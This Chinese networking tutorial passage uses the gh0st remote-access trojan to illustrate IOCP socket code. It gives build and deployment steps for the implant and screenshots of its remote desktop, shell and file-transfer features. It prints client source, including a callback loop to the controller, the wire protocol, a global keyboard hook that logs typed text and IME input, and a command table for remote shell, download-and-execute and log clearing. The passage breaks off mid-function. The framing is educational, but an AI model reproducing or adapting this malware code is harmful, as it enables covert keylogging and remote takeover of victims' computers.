## 网络通信基础重难点解析 18 ：IOCP 实例 - gh0st源码分析（以网络通信模块为重点）





上一小节，我们介绍了 Windows 系统上最强大的网络通信模型——完成端口模型（IOCP），但是只停留于一些用法介绍和理论讲解，这一节我们以 **gh0st** 这一曾经大名顶顶的远程控制软件的实战一下，我这个版本的 **gh0st** 网络通信模型使用的正是 **IOCP** 。由于，本小节的目的是为了演示前面各个章节介绍的网络通信基础，所以关于 gh0st 具体的一些业务逻辑细节不会作过多的介绍，而是以程序整体框架和网络通信模块为重点内容。

### Gh0st 的编译与使用方法

相信很多人应该或多或少地听说过 **gh0st** 的大名，正如上面所说，它是一款远程控制软件，其原始版本的代码和作者已经无从考证，笔者手里这一份也来源于网络，我修正一些 bug 并作了一些优化，**仅供个人学习研究，不可用于商业用途和任何非法用途，否则后果自负**。

代码下载方法：

> 关注文章末尾的微信公众号后，回复关键字【gh0st】即可得到下载方法。

#### 编译方法

下载好代码以后，使用 Visual Studio 2013 打开源码目录下的 **gh0st.sln** 文件，打开后，整个解决方案有两个工程分别是 **gh0st_server** 和 **gh0st_client**。如下图所示：

![](http://www.hootina.org/github_easyserverdev/20181228114745.png)



其中，**gh0st_server** 是远程控制的控制端，**gh0st_client** 是远程控制的被控制端。**gh0st_client** 通过网络连接 **gh0st_server** 并将自己所在的机器的一些基本信息（如计算机名、操作系统版本号、CPU 型号、有无摄像头等）反馈给控制端，连接成功以后**控制端**就可以通过网络将相应的控制命令发给**被控制端**了，**被控制端**将命令执行结果发给**控制端**，以此来达到远程控制目标主机的目的。原理示意如下：



![](http://www.hootina.org/github_easyserverdev/20181228120518.png)



为了让 **gh0st_client** 能够顺利连上 **gh0st_server**，需要根据你实际情形，将 **gh0st_client**连接的ip地址和端口号改成 **gh0st_server** 的端口号，修改方法是：打开源码目录下的 **Gh0st_Server_Svchost/svchost.cpp** 153 行有服务器 ip 地址设置代码：

```
TCHAR	*lpszHost = TEXT("127.0.0.1");
```

将代码中的 **127.0.0.1** 修改成你的控制端 **gh0st_server** 所在地址即可，如果你是本机测试，可以保持不变。笔者测试本软件控制端是我的机器，被控制端是笔者虚拟机里面另外一台 Windows 7 系统，笔者将地址修改成 **10.32.26.125**，这是我控制端的地址。

修改完 ip 地址之后，就可以编译这两个工程得到控制端和被控制端可执行程序了。点击Visual Studio 【**BUILD**】菜单下【**Rebuild Solution**】菜单项，即可进行编译，等编译完成之后，在目录 **Output\Debug\bin** 下会生成 **gh0st_server.exe** 和 **gh0st_client.exe** 两个可执行文件即为我们上文中介绍的**控制端**和**被控制端**。



#### 使用方法

我们先在本机上启动 **gh0st_server.exe**，然后在虚拟机中启动被控制端 **gh0st_client.exe**，很快 **gh0st_client** 就会连上 **gh0st_server**。这二者的启动顺序无所谓谁先谁后，因为 **gh0st_client** 有自动重连机制，被控制端连上控制端后，控制端（**gh0st_server**）的效果图如下所示：

![](http://www.hootina.org/github_easyserverdev/20181228131958.png)

当然，控制端可以同时控制多个被控制端，我这里在本机也开了一个被控制端，所以界面上会显示两个连上来的主机信息。

我们选择其中一个主机，点击右键菜单中的某一项就可以进行具体的控制操作了：

![](http://www.hootina.org/github_easyserverdev/20181228132428.png)

下面截取一些控制画面：

**文件管理**

![](http://www.hootina.org/github_easyserverdev/20181228132623.png)



**文件管理**功能可以自由从控制端被控制来回传送和运行文件。



**远程终端**

![](http://www.hootina.org/github_easyserverdev/20181228132756.png)



**远程桌面**

![](http://www.hootina.org/github_easyserverdev/20181228132955.png)



当然，**远程桌面**功能不仅可以查看远程电脑当前正在操作的界面，同时还可以控制它的操作，在远程桌面窗口标题栏右键弹出菜单中选择【**控制屏幕**】即可，当然为了控制的流畅性，你可以自由选择被控制端传过来的图片质量，最高是 **32位真彩色**。

![](http://www.hootina.org/github_easyserverdev/20181228133523.png)



为了节省篇幅，其他功能就不一一截图了，有兴趣的读者可以自行探索。



### gh0st_client 源码分析

#### 程序主脉络

我们先来看下被控制端的代码基本逻辑（原始代码位于 **svchost.cpp** 中），简化后的脉络代码如下：

```
int main(int argc, char **argv)
{  
    // lpServiceName,在ServiceMain返回后就没有了
    TCHAR	strServiceName[200];
    lstrcpy(strServiceName, TEXT("clientService"));
    //一个随机的名字
    TCHAR	strKillEvent[60];
    HANDLE	hInstallMutex = NULL;
    if (!CKeyboardManager::MyFuncInitialization())
        return -1;

    // 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
    SetErrorMode(SEM_FAILCRITICALERRORS);
    //TCHAR	*lpszHost = TEXT("127.0.0.1");
    TCHAR	*lpszHost = TEXT("10.32.26.125");
    DWORD	dwPort = 8080;
    TCHAR	*lpszProxyHost = NULL;//这里就当做是上线密码了

    HANDLE	hEvent = NULL;

    CClientSocket socketClient;
    socketClient.bSendLogin = true;
    BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
    while (1)
    {
        // 如果不是心跳超时，不用再sleep两分钟
        if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
        {
            // 2分钟断线重连, 为了尽快响应killevent
            for (int i = 0; i < 2000; i++)
            {
                hEvent = OpenEvent(EVENT_ALL_ACCESS, FALSE, strKillEvent);
                if (hEvent != NULL)
                {
                    socketClient.Disconnect();
                    CloseHandle(hEvent);
                    break;
                }
                // 每次睡眠60毫秒，一共睡眠2000次，共计两分钟
                Sleep(60);
            }
        }// end if

        if (!socketClient.Connect(lpszHost, dwPort))
        {
            bBreakError = CONNECT_ERROR;
            continue;
        }
        CKeyboardManager::dwTickCount = GetTickCount();
        // 登录
        DWORD dwExitCode = SOCKET_ERROR;
        sendLoginInfo_false(&socketClient);
        CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
        socketClient.setManagerCallBack(&manager);

        //////////////////////////////////////////////////////////////////////////
        // 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
        for (int i = 0; (i < 10 && !manager.IsActived()); i++)
        {
            Sleep(1000);
        }
        // 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
        if (!manager.IsActived())
            continue;

        DWORD	dwIOCPEvent;
        CKeyboardManager::dwTickCount = GetTickCount();
        do
        {
            hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
            dwIOCPEvent = WaitForSingleObject(socketClient.m_hExitEvent, 100);
            Sleep(500);
        } while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

        if (hEvent != NULL)
        {
            socketClient.Disconnect();
            CloseHandle(hEvent);
            break;
        }
    }// end while-loop

    SetErrorMode(0);
    ReleaseMutex(hInstallMutex);
    CloseHandle(hInstallMutex);

    return 0;
}
```

这段逻辑可以梳理成如下的流程图：

![](http://www.hootina.org/github_easyserverdev/20181228154852.png)



通过上图，我们得到程序三个**关键性执行络脉**：

- **脉络一**

我们可以知道要想让整个被控制端程序退出就需要收到所谓的**杀死事件**，判断收到杀死事件的机制是使用 Windows 的内核对象 **Event**（注意与 UI 事件循环那个 Event），在前面的多线程章节也介绍过，如果这个 Event 对象是一个命名对象，它是可以跨进程的共享的，当我们一个进程尝试使用 **OpenEvent** API 结合事件名称去打开它，如果这个命名对象已经存在，就会返回这个内核对象的句柄，反之如果不存在则返回 NULL，上述代码中 32 ～ 37 行，70、75 ～ 79行代码即是利用这个原理来控制程序是否退出。

```
hEvent = OpenEvent(EVENT_ALL_ACCESS, FALSE, strKillEvent);
if (hEvent != NULL)
{
    socketClient.Disconnect();
    CloseHandle(hEvent);
    break;
}
```

- **脉络二**

如果程序收到的是所谓的**退出事件**（**socketClient.m_hExitEvent**），则会断开当前连接，两分钟后重新连接。



- **脉络三**

如果不是**脉络一**和**脉络二**的逻辑，程序的主线程就会一直执行一个小的循环（上述代码 68 行 ～ 73 行），无限等待下去，这样做的目的是为了主线程不退出，这样支线程（工作线程）才能正常工作。那么有几个工作线程呢？分别是做什么工作？



#### 工作线程

##### 工作线程一

在主线程连接服务器时，调用了：

```
//svchost.cpp 211行
socketClient.Connect(lpszHost, dwPort)
```

在 **socketClient.Connect()** 函数中末尾处，即连接成功后，会新建一个工作线程，线程函数叫 **WorkThread**：

```
//ClientSocket.cpp 167行
m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);
```

**WorkThread** 函数的内容如下：

```
//ClientSocket.cpp 174行
DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)
{
    closesocket(NULL);

    CClientSocket *pThis = (CClientSocket *)lparam;
    char	buff[MAX_RECV_BUFFER];
    fd_set fdSocket;
    FD_ZERO(&fdSocket);
    FD_SET(pThis->m_Socket, &fdSocket);

    closesocket(NULL);

    while (pThis->IsRunning())
    {
        fd_set fdRead = fdSocket;
        int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
        if (nRet == SOCKET_ERROR)
        {
            pThis->Disconnect();
            break;
        }
        if (nRet > 0)
        {
            memset(buff, 0, sizeof(buff));
            int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);
            if (nSize <= 0)
            {
                pThis->Disconnect();
                break;
            }
            if (nSize > 0) 
                pThis->OnRead((LPBYTE)buff, nSize);
        }
    }

    return -1;
}
```

这段代码先用 **select** 函数检测连接 socket 上是否有数据可读，如果有数据则调用 recv 函数去收取数据，每次最多收取 **MAX_RECV_BUFFER**（8 * 1024） 个字节。由于这里 **select** 函数最后一个参数设置成了 NULL，如果当前没有可读数据，则 select 函数会无限阻塞该线程；如果 select 函数调用失败，则断开连接，在断开连接时，除了重置一些状态外，还会设置上文说的 **socketClient.m_hExitEvent** 事件对象，这样主线程就不会继续卡在上文说的那个循环中，而是会继续下一轮的重连服务器动作。

```
//ClientSocket.cpp 311行
void CClientSocket::Disconnect()
{
    //非重点代码省略...
    
    SetEvent(m_hExitEvent);
    
    //非重点代码省略...
}
```

如果成功收到数据以后，接着该工作线程调用 **pThis->OnRead((LPBYTE)buff, nSize);** 进行解包处理：

```
//SocketClient.cpp 227行
void CClientSocket::OnRead(LPBYTE lpBuffer, DWORD dwIoSize)
{

    closesocket(NULL);

    try
    {
        if (dwIoSize == 0)
        {
            Disconnect();
            return;
        }
        if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
        {
            // 重新发送	
            Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
            return;
        }
        // Add the message to out message
        // Dont forget there could be a partial, 1, 1 or more + partial mesages
        m_CompressionBuffer.Write(lpBuffer, dwIoSize);


        // Check real Data
        while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
        {
            BYTE bPacketFlag[FLAG_SIZE];
            CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));

            memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag));

            int nSize = 0;
            CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));


            if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
            {
                int nUnCompressLength = 0;
                // Read off header
                m_CompressionBuffer.Read((PBYTE)bPacketFlag, sizeof(bPacketFlag));
                m_CompressionBuffer.Read((PBYTE)&nSize, sizeof(int));
                m_CompressionBuffer.Read((PBYTE)&nUnCompressLength, sizeof(int));
                ////////////////////////////////////////////////////////
                ////////////////////////////////////////////////////////
                // SO you would process your data here
                // 
                // I'm just going to post message so we can see the data
                int	nCompressLength = nSize - HDR_SIZE;
                PBYTE pData = new BYTE[nCompressLength];
                PBYTE pDeCompressionData = new BYTE[nUnCompressLength];



                m_CompressionBuffer.Read(pData, nCompressLength);

                //////////////////////////////////////////////////////////////////////////
                unsigned long	destLen = nUnCompressLength;
                int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
                //////////////////////////////////////////////////////////////////////////
                if (nRet == Z_OK)
                {
                    m_DeCompressionBuffer.ClearBuffer();
                    m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
                    m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
                }


                delete[] pData;
                delete[] pDeCompressionData;
            }
            else
                break;
        }
    }
    catch (...)
    {
        m_CompressionBuffer.ClearBuffer();
        Send(NULL, 0);
    }

    closesocket(NULL);

}
```

这是一段非常经典的解包逻辑处理方式，通过这段代码我们也能得到 gh0st 使用的网络通信协议格式。

如果收到的数据大小是 **FLAG_SIZE**（5）个字节，且内容是 **gh0st** 这五个字母（这种序列称为 **Packet Flag**）：

```
if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
{
    // 重新发送	
    Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
    return;
}
```

**m_bPacketFlag** 是一个 5 字节的数据，其在 **CClientSocket** 对象构造函数中设置的：

```
//ClientSocket.cpp 34行
BYTE bPacketFlag[] = { 'g', 'h', '0', 's', 't' };
memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
```

这个 **Packet Flag** 的作用是 **gh0st** 控制端和被控制端协商好的，如果某一次某一端收到仅仅含有 **Packet Flag**  的数据，该端会重发上一次的数据包。这个我们可以通过发数据的函数中的逻辑可以看出来：

```
//SocketClient.cpp 340行
int CClientSocket::Send(LPBYTE lpData, UINT nSize)
{
    closesocket(NULL);

    m_WriteBuffer.ClearBuffer();

    if (nSize > 0)
    {
        // Compress data
        unsigned long	destLen = (double)nSize * 1.001 + 12;
        GetTickCount();
        LPBYTE			pDest = new BYTE[destLen];

        if (pDest == NULL)
            return 0;

        int	nRet = compress(pDest, &destLen, lpData, nSize);

        if (nRet != Z_OK)
        {
            delete[] pDest;
            return -1;
        }

        //////////////////////////////////////////////////////////////////////////
        LONG nBufLen = destLen + HDR_SIZE;
        // 5 bytes packet flag
        m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
        // 4 byte header [Size of Entire Packet]
        m_WriteBuffer.Write((PBYTE)&nBufLen, sizeof(nBufLen));
        // 4 byte header [Size of UnCompress Entire Packet]
        m_WriteBuffer.Write((PBYTE)&nSize, sizeof(nSize));
        // Write Data
        m_WriteBuffer.Write(pDest, destLen);
        delete[] pDest;

        //原始未压缩的数据先备份一份
        // 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
        LPBYTE lpResendWriteBuffer = new BYTE[nSize];

        GetForegroundWindow();

        CopyMemory(lpResendWriteBuffer, lpData, nSize);

        GetForegroundWindow();

        m_ResendWriteBuffer.ClearBuffer();
        m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
        if (lpResendWriteBuffer)
            delete[] lpResendWriteBuffer;
    }
    else // 要求重发, 只发送FLAG
    {
        m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
        m_ResendWriteBuffer.ClearBuffer();
        m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
    }

    // 分块发送
    return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}
```

这个函数的第二个参数 **nSize** 如果不大于 **0**， 则调用该函数时的作用就是发一下该 **Packet Flag**，对端收到该 Flag 数据后就会重发上一次的包，为了方便重复本端上一的数据包，每次正常发数据的时候，会将本次发送的数据备份到 **m_ResendWriteBuffer** 成员变量中去，下一次取出该数据即可重发。

如果收到的不是重发标志，则将数据放到接收缓冲区 **m_CompressionBuffer** 中，这也是一个成员变量，而且其数据是压缩后的，接下来就是解包的过程。

```
//ClientSocket.cpp 247行
m_CompressionBuffer.Write(lpBuffer, dwIoSize);


        // Check real Data
        while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
        {
            BYTE bPacketFlag[FLAG_SIZE];
            CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));

            memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag));

            int nSize = 0;
            CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));


            if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
            {
                int nUnCompressLength = 0;
                // Read off header
                m_CompressionBuffer.Read((PBYTE)bPacketFlag, sizeof(bPacketFlag));
                m_CompressionBuffer.Read((PBYTE)&nSize, sizeof(int));
                m_CompressionBuffer.Read((PBYTE)&nUnCompressLength, sizeof(int));
                ////////////////////////////////////////////////////////
                ////////////////////////////////////////////////////////
                // SO you would process your data here
                // 
                // I'm just going to post message so we can see the data
                int	nCompressLength = nSize - HDR_SIZE;
                PBYTE pData = new BYTE[nCompressLength];
                PBYTE pDeCompressionData = new BYTE[nUnCompressLength];



                m_CompressionBuffer.Read(pData, nCompressLength);

                //////////////////////////////////////////////////////////////////////////
                unsigned long	destLen = nUnCompressLength;
                int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
                //////////////////////////////////////////////////////////////////////////
                if (nRet == Z_OK)
                {
                    m_DeCompressionBuffer.ClearBuffer();
                    m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
                    m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
                }


                delete[] pData;
                delete[] pDeCompressionData;
            }
            else
                break;
        }
```

这个过程如下：

![](http://www.hootina.org/github_easyserverdev/20181228174657.png)

##### gh0st 的通信协议

根据上面的流程，我们可以得到 **gh0st** 网络通信协议包的格式，我们用一个结构体来表示一下：

```
//让该结构体以一个字节对齐
#pragma pack(push, 1)
struct Gh0stPacket
{
    //5字节package flag: 内容是gh0st
    char flag[5];
    //4字节的包大小
    int32_t packetSize;
    //4字节包体压缩前大小
    int32_t bodyUncompressedSize;
    //数据内容，长度为packetSize-13
    char data[0];
}
#pragma pack(pop)
```

当发送数据装包的过程和这个解包的过程刚好相反，位于上面说的 **CClientSocket::Send** 函数里面，这里就不再重复介绍了。



##### 工作线程二

我们刚才介绍了，当解析完一个完整的数据包后，把它放入CClientSocket 的成员变量 **m_DeCompressionBuffer** 中，然后交给 **m_pManager->OnReceive()** 函数处理，**m_pManager** 是一个基类 **CManager** 对象指针，其 **OnReceive** 函数我们要看其指向的子类方法的具体实现。这个对象在哪里设置的呢？

在我们上面介绍的程序主脉络中我们说主线程中有一个步骤是**等待控制端发送激活命令**，这个步骤有这样一段代码：

```
//svchost.cpp 220行
CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, 
						lpszHost, dwPort);
socketClient.setManagerCallBack(&manager);
```

在这里我们可以得出 **CClientSocket.m_pManager** 指向的实际对象是 **CKernelManager**，同时在 CKernelManager 的**构造函数中**又新建了一个工作线程，线程函数叫 **Loop_HookKeyboard**。

```
//KernelManager.cpp 111行
m_nThreadCount = 0;
// 创建一个监视键盘记录的线程
// 键盘HOOK跟UNHOOK必须在同一个线程中
m_hThread[m_nThreadCount++] =
MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0, NULL, true);
```

这个线程句柄被保存在 CKernelManager 的 **m_hThread** 数组中。线程函数 **Loop_HookKeyboard** 内容如下：

```
//Loop.h 76行
DWORD WINAPI Loop_HookKeyboard(LPARAM lparam)
{
    TCHAR szModule[MAX_PATH - 1];
    TCHAR	strKeyboardOfflineRecord[MAX_PATH];
    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
    CKeyboardManager::MyGetSystemDirectory(strKeyboardOfflineRecord, ARRAYSIZE(strKeyboardOfflineRecord));
    lstrcat(strKeyboardOfflineRecord, TEXT("\\desktop.inf"));

    if (GetFileAttributes(strKeyboardOfflineRecord) != INVALID_FILE_ATTRIBUTES /*- 1*/)
    {
        int j = 1;
        g_bSignalHook = j;
    }
    else
    {
        //		CloseHandle(CreateFile( strKeyboardOfflineRecord, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL));
        //		g_bSignalHook = true;
        int i = 0;
        g_bSignalHook = i;
    }
    //		g_bSignalHook = false;

    while (1)
    {
        while (g_bSignalHook == 0)
        {
            Sleep(100);
        }
        CKeyboardManager::StartHook();
        while (g_bSignalHook == 1)
        {
            CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
            Sleep(100);
        }
        CKeyboardManager::StopHook();
    }

    return 0;
}
```

其核心的代码是安装一个类型为 **WH_GETMESSAGE** 的Windows Hook （钩子） 的 **CKeyboardManager::StartHook()**：

```
//KeyboardManager.cpp 313行
bool CKeyboardManager::StartHook()
{
    //...无关代码省略...
    m_pTShared->hGetMsgHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, g_hInstance, 0);
    //...无关代码省略

    return true;
}
```

**WH_GETMESSAGE** 类型的钩子会截获钩子所在系统上的所有使用 **GetMessage** 或 **PeekMessage** API 从消息队列中取消息的程序的消息。拿到消息后，对消息的处理放在 **GetMsgProc** 函数中：

```
//KeyboardManager.cpp 167行
LRESULT CALLBACK CKeyboardManager::GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    TCHAR szModule[MAX_PATH];

    MSG*	pMsg;
    TCHAR	strChar[2];
    TCHAR	KeyName[20];
    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
    LRESULT result = CallNextHookEx(m_pTShared->hGetMsgHook, nCode, wParam, lParam);
    CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);

    pMsg = (MSG*)(lParam);
    // 防止消息重复产生记录重复，以pMsg->time判断
    if (
        (nCode != HC_ACTION) ||
        ((pMsg->message != WM_IME_COMPOSITION) && (pMsg->message != WM_CHAR)) ||
        (m_dwLastMsgTime == pMsg->time)
        )
    {
        return result;
    }

    m_dwLastMsgTime = pMsg->time;

    if ((pMsg->message == WM_IME_COMPOSITION) && (pMsg->lParam & GCS_RESULTSTR))
    {
        HWND	hWnd = pMsg->hwnd;
        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        HIMC	hImc = ImmGetContext(hWnd);
        CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
        LONG	strLen = ImmGetCompositionString(hImc, GCS_RESULTSTR, NULL, 0);
        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        // 考虑到UNICODE
        strLen += sizeof(WCHAR);
        CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
        ZeroMemory(m_pTShared->str, sizeof(m_pTShared->str));
        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        strLen = ImmGetCompositionString(hImc, GCS_RESULTSTR, m_pTShared->str, strLen);
        CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
        ImmReleaseContext(hWnd, hImc);
        CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
        SaveInfo(m_pTShared->str);
    }

    if (pMsg->message == WM_CHAR)
    {
        if (pMsg->wParam <= 127 && pMsg->wParam >= 20)
        {
            strChar[0] = pMsg->wParam;
            strChar[1] = TEXT('\0');
            SaveInfo(strChar);
        }
        else if (pMsg->wParam == VK_RETURN)
        {
            SaveInfo(TEXT("\r\n"));
        }
        // 控制字符
        else
        {
            CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
            memset(KeyName, 0, sizeof(KeyName));
            CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
            if (GetKeyNameText(pMsg->lParam, &(KeyName[1]), sizeof(KeyName)-2) > 0)
            {
                KeyName[0] = TEXT('[');
                CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
                lstrcat(KeyName, TEXT("]"));
                SaveInfo(KeyName);
            }
        }
    }
    return result;
}
```

该函数所做的工作就是记录被监控的电脑上的键盘输入，然后调用 **SaveInfo** 函数或存盘或发给控制端。



让我们继续来看 **CKernelManager::OnReceive()** 函数如何对解析后的数据包进行处理的：

```
//KernelManager.cpp 136行
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
    switch (lpBuffer[0])
    {
    //服务端可以激活开始工作
    case COMMAND_ACTIVED:
    {
        //代码省略...
        break;
    case COMMAND_LIST_DRIVE: // 文件管理
        m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, (LPVOID)m_pClient->m_Socket, 0, NULL, false);
        break;
    case COMMAND_SCREEN_SPY: // 屏幕查看
        //代码省略...
        break;
    case COMMAND_WEBCAM: // 摄像头
        //代码省略...
        break;
        //	case COMMAND_AUDIO: // 语音
        //代码省略...
        //		break;
    case COMMAND_SHELL: // 远程shell
        //代码省略...
        break;
    case COMMAND_KEYBOARD:
        //代码省略...
        break;
    case COMMAND_SYSTEM:
        //代码省略...
        break;
    case COMMAND_DOWN_EXEC: // 下载者
        //代码省略...
        SleepEx(101, 0); // 传递参数用
        break;
    case COMMAND_OPEN_URL_SHOW: // 显示打开网页
        //代码省略...
        break;
    case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
        //代码省略...
        break;
    case COMMAND_REMOVE: // 卸载,
        //代码省略...
        break;
    case COMMAND_CLEAN_EVENT: // 清除日志
    	//代码省略...
        break;
    case COMMAND_SESSION:
        //代码省略...
        break;
    case COMMAND_RENAME_REMARK: // 改备注
        //代码省略...
        break;
    case COMMAND_UPDATE_SERVER: // 更新服务端
        //代码省略...
        break;
    case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
        //代码省略...
        break;
    }
}
```

通过上面的代码，我们知道解析后的数据包第一个字节就是控制端发给被控制端的命令号，剩下的数据，根据控制类型的不同而具体去解析。控制端每发起一个控制，都会新建一个线程来处理，这些线程句柄都记录在上文说的 **CKernelManager::m_hThread** 数组中。我们以**文件管理**这条命令为例，创建的文件管理线程函数如下：

```
//Loop.h 18行
DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
    CClientSocket	socketClient;
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;
    CFileManager	manager(&socketClient);
    socketClient.run_event_loop();

    return 0;
}
```

在这个线程函数中又重新创建了一个 **CClientSocket** 对象，然后利用这个对象重新连接一下服务器，ip 地址和端口号与前面的一致。由于 **socketClient** 和 **manager** 都是一个栈变量，为了避免其出了函数作用域失效， **socketClient.run_event_loop()** 会通过退出事件阻塞这个函数的退出：

```
//ClientSocket.cpp 212行
void CClientSocket::run_event_loop()
{
    //...无关代码省略...

    WaitForSingleObject(m_hExitEvent, INFINITE);
}
```

在 **CFileManager** 对象的构造函数中，将驱动器列表发给控制端：

```
//FileManager.cpp 17行
CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
{
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// 发送驱动器列表, 开始进行文件管理，建立新线程
	SendDriveList();
}
```

现在已经有两个 socket 与服务器端相关联了，服务器端关于文件管理类的指令是发给后一个 socket 的。当收到与文件操作相关的命令，**CFileManager::OnReceive** 函数将处理这些这些命令，并发送处理结果：

```
//FileManager.cpp 29行
void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	
	closesocket(NULL);
	
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:// 获取文件列表
		SendFilesList((char *)lpBuffer + 1);
		break;
	case COMMAND_DELETE_FILE:// 删除文件
		DeleteFileA((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:// 删除文件
		////printf("删除目录 %s\n", (char *)(bPacket + 1));
		DeleteDirectory((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DOWN_FILES: // 上传文件
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE: // 上传文件
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:
		StopTransfer();
		break;
	case COMMAND_SET_TRANSFER_MODE:
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:
		WriteLocalRecvFile(lpBuffer + 1, nSize -1);
		break;
	case COMMAND_OPEN_FILE_SHOW:
		OpenFile((TCHAR *)lpBuffer + 1, SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:
        OpenFile((TCHAR *)lpBuffer + 1, SW_HIDE);
		break;
	default:
		break;
	}
}
```



关于文件具体指令的执行这里就不分析了，其原理就是调用相关 Windows 文件 API 来操作磁盘或文件（夹）。

下图是我们在控制端同时开启三个文件管理窗口和一个远程桌面窗口的效果截图：

![](http://www.hootina.org/github_easyserverdev/20181228194153.png)



### gh0st_server 源码分析

**gh0st_server** 使用的框架是 MFC，部分界面元素使用了 **CJ60Lib**。关于界面部分，我们这里就不做介绍了。

#### 笔者修正的 bug

原始的 gh0st_server 代码由于在网络线程中直接操作 UI 元素，这在 **CJ60Lib** 中会导致程序崩溃。我们来看一下原始的逻辑：

```
//IOCPServer.cpp 868行
bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
{
    CLock cs(CIOCPServer::m_cs, "OnClientReading");
    try
    {
        //////////////////////////////////////////////////////////////////////////
        static DWORD nLastTick = GetTickCount();
        static DWORD nBytes = 0;
        nBytes += dwIoSize;

        if (GetTickCount() - nLastTick >= 1000)
        {
            nLastTick = GetTickCount();
